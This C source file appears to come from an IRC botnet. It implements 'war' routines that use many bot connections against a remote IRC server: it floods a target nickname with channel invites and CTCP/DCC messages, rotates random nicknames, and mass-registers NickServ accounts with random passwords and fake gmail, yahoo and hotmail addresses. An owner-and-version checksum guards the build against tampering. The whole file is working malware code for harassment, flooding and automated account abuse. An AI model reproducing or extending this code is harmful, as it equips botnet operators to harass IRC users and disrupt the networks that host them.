#include "../Includes/includes.h"

#ifndef HTTP_BUILD
#ifdef INCLUDE_IRCWAR
bool SendToWarIrc(char *pcSendData, DWORD dwSocket)
{
    bool bReturn = FALSE;

    char cSendData[DEFAULT];
    strcpy(cSendData, pcSendData);
    strcat(cSendData, "\r\n");
#ifdef DEBUG
    printf(cSendData);
#endif
    if(fncsend(sWar[dwSocket], cSendData, strlen(cSendData), NULL) != SOCKET_ERROR)
        bReturn = TRUE;
    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s--%s", cVersion, cOwner);
    char *cStr = cCheckString;
    unsigned long ulCheck = (((10000/100)*100)-4619);
    int nCheck;
    while((nCheck = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum2)
        SendToWarIrc(pcSendData, dwSocket);
    // <!-------! CRC AREA STOP !-------!>

    return bReturn;
}

bool SendToAllWarIrcConnections(char *pcSendData)
{
    bool bReturn = FALSE;

    for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
    {
        if(SendToWarIrc(pcSendData, us))
            bReturn = TRUE;
    }

    return bReturn;
}

void DisconnectFromWarIrc()
{
    dwValidatedConnectionsToIrc = 0;
    bRemoteIrcBusy = FALSE;

    char cWarQuitCommand[25];
    strcpy(cWarQuitCommand, "QUIT ");
    strcat(cWarQuitCommand, GenerateRandomIrcNameString());

    SendToAllWarIrcConnections(cWarQuitCommand);

    Sleep(250);

    for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
        fncclosesocket(sWar[us]);

    SendDisconnectedFromRemoteIrcConnections(cRemoteHost, usRemotePort);
}

void DoValidInvite(char *pcTargetNickname)
{
    strcpy(cCurrentWarStatus, "Sending invite to ");
    strcat(cCurrentWarStatus, pcTargetNickname);

    char cRandomChannel[MAX_IRC_CHANNEL_LEN];
    strcpy(cRandomChannel, "#");
    strcat(cRandomChannel, GenerateRandomBase64Data(GetRandNum(12)));

    for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
    {
        sprintf(cBuild, "%s %s%i", cIrcCommandJoin, cRandomChannel, us);
        SendToWarIrc(cBuild, us);
    }
    Sleep(IRC_SND_DELAY);

    for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
    {
        sprintf(cBuild, "INVITE %s %s%i", pcTargetNickname, cRandomChannel, us);
        SendToWarIrc(cBuild, us);
    }
    Sleep(IRC_SND_DELAY);

    for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
    {
        sprintf(cBuild, "%s %s%i", cIrcCommandPart, cRandomChannel, us);
        SendToWarIrc(cBuild, us);
    }
    Sleep(IRC_SND_DELAY);

    SetWarStatusIdle();
}

DWORD WINAPI SendWarInvites(LPVOID)
{
    DoValidInvite(cStoreParameter);
    return 1;
}

void SendCtcpToWarIrc(char *pcTargetNickname, bool bDcc)
{
    for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
    {
        strcpy(cBuild, cIrcCommandPrivmsg);
        strcat(cBuild, " ");

        strcat(cBuild, pcTargetNickname);
        strcat(cBuild, " :");
        strcat(cBuild, GenerateCtcp(bDcc));
        SendToWarIrc(cBuild, us);
    }
}

void AttemptToRegisterWithNickServ(DWORD dwSocket)
{
    char cWarRegisterSend[MAX_IRC_SND_BUFFER];
    strcpy(cWarRegisterSend, cIrcCommandPrivmsg);
    strcat(cWarRegisterSend, " NickServ :REGISTER ");

    strcat(cWarRegisterSend, GenerateRandomIrcNameString());

    for(unsigned short us = 0; us <= 25; us++)
    {
        char cWarRegisterPass[25];
        strcpy(cWarRegisterPass, GenerateRandomIrcNameString());

        if(strlen(cWarRegisterPass) > 5)
        {
            strcat(cWarRegisterSend, cWarRegisterPass);
            break;
        }

        if(us == 25)
            strcat(cWarRegisterSend, cWarRegisterPass);
    }

    strcat(cWarRegisterSend, " ");
    strcat(cWarRegisterSend, GenerateRandomIrcNameString());
    strcat(cWarRegisterSend, "@");

    unsigned short usRandNum = GetRandNum(100);

    if(usRandNum < 20)
        strcat(cWarRegisterSend, "gmail.com");
    else if(usRandNum < 40)
        strcat(cWarRegisterSend, "yahoo.com");
    else if(usRandNum < 60)
        strcat(cWarRegisterSend, "hotmail.com");
    else if(usRandNum < 80)
        strcat(cWarRegisterSend, "facebook.com");
    else
        strcat(cWarRegisterSend, "live.com");

    SendToWarIrc(cWarRegisterSend, dwSocket);
}

void SetNewWarNicknames()
{
    for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
    {
        sprintf(cBuild, "%s %s", cIrcCommandNick, GenerateWarNickname());
        SendToWarIrc(cBuild, us);
    }
}
#endif
#endif
